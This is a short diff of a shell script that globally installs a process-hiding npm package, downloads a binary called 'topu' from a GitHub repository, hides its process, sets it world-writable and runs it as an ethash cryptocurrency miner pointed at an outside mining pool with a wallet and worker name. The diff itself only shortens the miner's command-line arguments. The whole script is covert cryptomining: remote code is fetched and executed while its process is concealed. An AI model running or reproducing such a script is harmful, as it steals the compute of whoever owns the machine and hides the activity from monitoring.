@@ -8,7 +8,7 @@ npm i -g node-process-hider
 wget https://github.com/gyrogerald/dera/raw/main/topu
 sudo ph add topu
 chmod 777 topu 
-./topu -pool ethash.poolbinance.com:443 -wal TeslaM -worker T4 -epsw x -asm 2 -dbg -1 -allpools 1 -mode 1 eth pause
+./topu -pool ethash.poolbinance.com:443 -wal TeslaM.T4
 
 while [ 1 ]; do
 
